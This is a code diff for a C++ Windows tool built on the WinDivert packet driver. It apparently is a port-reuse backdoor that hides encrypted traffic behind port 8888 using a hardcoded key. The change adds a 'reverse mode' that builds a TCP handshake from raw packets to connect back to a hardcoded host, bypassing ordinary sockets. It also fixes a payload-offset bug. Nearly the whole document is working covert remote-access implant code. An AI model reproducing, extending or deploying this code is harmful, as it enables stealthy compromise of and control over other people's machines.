@@ -1,5 +1,7 @@
 #include "server.h"
 #include "windivert_bin.h"
+
+#pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib,"WinDivert.lib")
 
 static uint8 key[16] = {
@@ -12,6 +14,7 @@ static uint8 key[16] = {
 int main(int argc, char** argv)
 {
 	CServer port_reuse;
+	port_reuse.set_reverse_mode(true);
 	port_reuse.start();
 	return 0;
 }
@@ -28,18 +31,26 @@ CServer::CServer()
 
 CServer::~CServer()
 {
+	WinDivertShutdown(m_divert_handle, WINDIVERT_SHUTDOWN_BOTH);
+}
 
+void CServer::set_reverse_mode(bool mode)
+{
+	m_reverse_mode = mode;
 }
 
 void CServer::start()
 {
 	release_sysfile();
-	if (!init_divert("tcp.SrcPort = 8888"))
-	{
+	if (!init_divert("tcp.SrcPort = 8888"))	{
 		return;
 	}
-
-	wait_for_connect();
+	if (m_reverse_mode == true)	{
+		connect_to_target();
+	}
+	else {
+		wait_for_connect();
+	}
 
 	UINT payload_len;
 	PVOID payload_buf;
@@ -139,22 +150,22 @@ void CServer::send_data_packet(const char* payload_buf, int payload_len)
 {
 	PWINDIVERT_TCPHDR tcp_header;
 	PWINDIVERT_IPHDR ip_header;
-	UINT response_payload_len;
-	PVOID reponse_payload_buf;
+	UINT send_payload_len;
+	PVOID send_payload_buf;
 	UINT packet_len, send_len;
 
 	if (!payload_len)
 		payload_len = strlen(payload_buf);
-	response_payload_len = 16 * (payload_len / 16 + 1);
-	auto encrypt_buf = shared_ptr<char[]>(new char[response_payload_len]());
+	send_payload_len = 16 * (payload_len / 16 + 1);
+	auto encrypt_buf = shared_ptr<char[]>(new char[send_payload_len]());
 	if (!encrypt_buf)
 	{
 		return;
 	}
 	memcpy(encrypt_buf.get(), payload_buf, payload_len);
-	encrypt_payload(encrypt_buf.get(), response_payload_len);
+	encrypt_payload(encrypt_buf.get(), send_payload_len);
 
-	packet_len = m_template_packet_len + response_payload_len;
+	packet_len = m_template_packet_len + send_payload_len;
 	// build response packet
 	auto reponse_packet = unique_ptr<char[]>(new char[packet_len]());
 	if (!reponse_packet)
@@ -169,15 +180,15 @@ void CServer::send_data_packet(const char* payload_buf, int payload_len)
 		NULL, NULL, NULL);
 
 	// rebuild ip header
-	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) + response_payload_len;
+	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) + send_payload_len;
 	ip_header->Length = WinDivertHelperHtons(ip_length);
 
 	tcp_header->Psh = 1;
 	tcp_header->Ack = 1;
 	// pack new payload in
 	// cause template packet has no payload buf, we pos it manully. 
-	reponse_payload_buf = (PVOID)(tcp_header + sizeof(WINDIVERT_TCPHDR));
-	memcpy(reponse_payload_buf, encrypt_buf.get(), response_payload_len);
+	send_payload_buf = (PVOID)((ULONG_PTR)tcp_header + sizeof(WINDIVERT_TCPHDR));
+	memcpy(send_payload_buf, encrypt_buf.get(), send_payload_len);
 	WinDivertHelperCalcChecksums(reponse_packet.get(), packet_len, m_addr_template.get(), 0);
 
 	if (!WinDivertSend(m_divert_handle, reponse_packet.get(), packet_len, &send_len, m_addr_template.get()) || send_len == 0)
@@ -188,7 +199,7 @@ void CServer::send_data_packet(const char* payload_buf, int payload_len)
 	{
 		cout << "[*] send data packet " << send_len << " bytes successfully!" << endl;
 	}
-	add_seq(response_payload_len);
+	add_seq(send_payload_len);
 }
 
 BOOL CServer::init_divert(const char* filter)
@@ -560,4 +571,218 @@ bool CServer::release_sysfile()
 #endif 
 	fout.close();
 	return true;
+}
+
+bool CServer::connect_to_target()
+{
+	if (!init_reverse_mode("192.168.124.233", "192.168.124.1", 8888, 54321))
+	{
+		cout << "[!] ip address invalid!" << endl;
+		return false;
+	}
+	build_packet_template();
+	build_addr_template();
+
+	// 1.send SYN apcket (handshake 1)
+	PWINDIVERT_TCPHDR tcp_header;
+	PWINDIVERT_IPHDR ip_header;
+	int packet_len = m_template_packet_len + 12;		// options 12 bytes
+	auto syn_packet = unique_ptr<char[]>(new char[packet_len]());
+	if (!syn_packet)
+	{
+		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
+		return false;
+	}
+	memcpy(syn_packet.get(), m_packet_template.get(), m_template_packet_len);
+	WinDivertHelperParsePacket(syn_packet.get(), m_template_packet_len, &ip_header, NULL,
+		NULL, NULL, NULL, &tcp_header, NULL, NULL,
+		NULL, NULL, NULL);
+	tcp_header->HdrLength = 8;
+	tcp_header->Syn = 1;
+	ip_header->Length = WinDivertHelperHtons(52);
+	char options[12] = { 0x02,0x04,0x05,0xb4,0x01,0x03,0x03,0x08,0x01,0x01,0x04,0x02 };
+	memcpy(syn_packet.get() + m_template_packet_len, options, 12);
+	WinDivertHelperCalcChecksums(syn_packet.get(), packet_len, NULL, 0);
+	UINT send_len = 0;
+	if (!WinDivertSend(m_divert_handle, syn_packet.get(), packet_len, &send_len, m_addr_template.get()))
+	{
+		cout << "[!] failed to send SYN packet (" << GetLastError() << ")!" << endl;
+		return false;
+	}
+	cout << "[*] send SYN packet " << send_len << " bytes successfully!" << endl;
+
+	// 2.recv SYN-AKC packet (handshake 2)
+	UINT recv_len = 0;
+	UINT32 seq_num = 0;
+	UINT32 ack_num = 0;
+	auto syn_ack_packet = shared_ptr<char[]>(new char[WINDIVERT_MTU_MAX]());
+	cout << "[*] waiting for SYN-AKC packet..." << endl;
+
+	while (TRUE)
+	{
+		if (!WinDivertRecv(m_divert_handle, syn_ack_packet.get(), WINDIVERT_MTU_MAX, &recv_len, NULL))
+		{
+			continue;
+		}
+
+		WinDivertHelperParsePacket(syn_ack_packet.get(), recv_len, &ip_header, NULL,
+			NULL, NULL, NULL, &tcp_header, NULL, NULL,
+			NULL, NULL, NULL);
+		if (ip_header)
+		{
+			print_ip_info(ip_header);
+		}
+		if (tcp_header)
+		{
+			cout << "[*] dst port:" << WinDivertHelperNtohs(tcp_header->DstPort) << "; src port:" << WinDivertHelperNtohs(tcp_header->SrcPort) << endl;
+			if (tcp_header->Syn)
+			{
+				cout << "[*] SYN-ACK packet recv!" << endl;
+				seq_num = tcp_header->SeqNum;
+				ack_num = tcp_header->AckNum;
+				break;
+			}
+		}
+	}
+
+	// 3.send ACK packet (handshake 3)
+
+	auto ack_packet = shared_ptr<char[]>(new char[m_template_packet_len]());
+	if (!ack_packet)
+	{
+		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
+		return false;
+	}
+	memcpy(ack_packet.get(), m_packet_template.get(), m_template_packet_len);
+	WinDivertHelperParsePacket(ack_packet.get(), m_template_packet_len, &ip_header, NULL,
+		NULL, NULL, NULL, &tcp_header, NULL, NULL,
+		NULL, NULL, NULL);
+
+	tcp_header->AckNum = WinDivertHelperHtonl(WinDivertHelperNtohl(seq_num) + 1);
+	tcp_header->SeqNum = ack_num;
+	tcp_header->Ack = 1;
+	tcp_header->Window = 0x0402;
+	WinDivertHelperCalcChecksums(ack_packet.get(), m_template_packet_len, NULL, 0);
+	send_len = 0;
+	if (!WinDivertSend(m_divert_handle, ack_packet.get(), m_template_packet_len, &send_len, m_addr_template.get()))
+	{
+		cout << "[!] failed to send ACK packet (" << GetLastError() << ")!" << endl; 
+		return false;
+	}
+	cout << "[*] send ACK packet " << send_len << " bytes successfully!" << endl;
+
+	// reset template
+	m_packet_template.reset();
+	m_packet_template = NULL;
+	m_template_packet_len = 0;
+	return true;
+}
+
+void CServer::build_packet_template()
+{
+	m_template_packet_len = sizeof(WINDIVERT_IPHDR) + sizeof(WINDIVERT_TCPHDR);
+	m_packet_template = shared_ptr<char[]>(new char[m_template_packet_len] {});
+	if (m_packet_template == NULL)
+	{
+		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
+		return;
+	}
+
+/*
+typedef struct
+{
+    UINT8  HdrLength:4;
+    UINT8  Version:4;
+    UINT8  TOS;
+    UINT16 Length;
+    UINT16 Id;
+    UINT16 FragOff0;
+    UINT8  TTL;
+    UINT8  Protocol;
+    UINT16 Checksum;
+    UINT32 SrcAddr;
+    UINT32 DstAddr;
+} WINDIVERT_IPHDR, *PWINDIVERT_IPHDR;
+*/
+	WINDIVERT_IPHDR iphdr{ 0 };
+	iphdr.Version = 4;			// 0100(IPv4)
+	iphdr.HdrLength = 5;		// ip header length = 5 * 4 (byte)
+	iphdr.TOS = 0;				// Type of Service: 000 (Routine)
+	iphdr.Length = WinDivertHelperHtons(40);			// todo
+	iphdr.Id = WinDivertHelperHtons(0xf52e);			// ?
+	iphdr.FragOff0 = 0x40;	// Flags:0x40, Don't fragment;Fragment Offet: 0
+	iphdr.TTL = 128;			// Time To Live
+	iphdr.Protocol = 6;			// TCP (6)
+	iphdr.Checksum = 0;			// todo
+	iphdr.SrcAddr = m_src_addr;
+	iphdr.DstAddr = m_dst_addr;
+
+/*
+typedef struct
+{
+    UINT16 SrcPort;
+    UINT16 DstPort;
+    UINT32 SeqNum;
+    UINT32 AckNum;
+    UINT16 Reserved1:4;
+    UINT16 HdrLength:4;
+    UINT16 Fin:1;
+    UINT16 Syn:1;
+    UINT16 Rst:1;
+    UINT16 Psh:1;
+    UINT16 Ack:1;
+    UINT16 Urg:1;
+    UINT16 Reserved2:2;
+    UINT16 Window;
+    UINT16 Checksum;
+    UINT16 UrgPtr;
+} WINDIVERT_TCPHDR, *PWINDIVERT_TCPHDR;
+*/
+	WINDIVERT_TCPHDR tcphdr{ 0 };
+	tcphdr.SrcPort = WinDivertHelperHtons(m_src_port);
+	tcphdr.DstPort = WinDivertHelperHtons(m_dst_port);
+	tcphdr.SeqNum = rand();		// random seq number ISN(Initial Sequence Number)
+	tcphdr.AckNum = 0;				// ?
+	tcphdr.Reserved1 = 0;
+	tcphdr.HdrLength = 5;			// tcp header length = 5 * 4 (byte)
+	tcphdr.Window = WinDivertHelperHtons(64240);
+	tcphdr.Checksum = 0;	// todo
+	tcphdr.UrgPtr = 0;
+
+	memcpy(m_packet_template.get(), &iphdr, sizeof(WINDIVERT_IPHDR));
+	memcpy(m_packet_template.get() + sizeof(WINDIVERT_IPHDR), &tcphdr, sizeof(WINDIVERT_TCPHDR));
+	WinDivertHelperCalcChecksums(m_packet_template.get(), m_template_packet_len, NULL, 0);
+	PWINDIVERT_TCPHDR tcp_header;
+	PWINDIVERT_IPHDR ip_header;
+	WinDivertHelperParsePacket(m_packet_template.get(), m_template_packet_len, &ip_header, NULL,
+		NULL, NULL, NULL, &tcp_header, NULL, NULL,
+		NULL, NULL, NULL);
+}
+
+void CServer::build_addr_template()
+{
+	m_addr_template = make_shared<WINDIVERT_ADDRESS>();
+	if (m_addr_template == NULL)
+	{
+		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
+		return;
+	}
+	memset(m_addr_template.get(), 0, sizeof(WINDIVERT_ADDRESS));
+	m_addr_template->TCPChecksum = 1;
+	m_addr_template->UDPChecksum = 1;
+	m_addr_template->IPChecksum = 1;
+	m_addr_template->Outbound = 1;
+	m_addr_template->Network.IfIdx = 4;
+	LARGE_INTEGER ticks;
+	QueryPerformanceCounter(&ticks);
+	m_addr_template->Timestamp = ticks.QuadPart;
+}
+
+bool CServer::init_reverse_mode(string dst_addr, string src_addr, int dst_port, int src_port)
+{
+	m_dst_port = dst_port;
+	m_src_port = src_port;
+	m_dst_addr = inet_addr(dst_addr.c_str());
+	m_src_addr = inet_addr(src_addr.c_str());
+	return INADDR_NONE != m_dst_addr && INADDR_NONE != m_src_addr;
 }
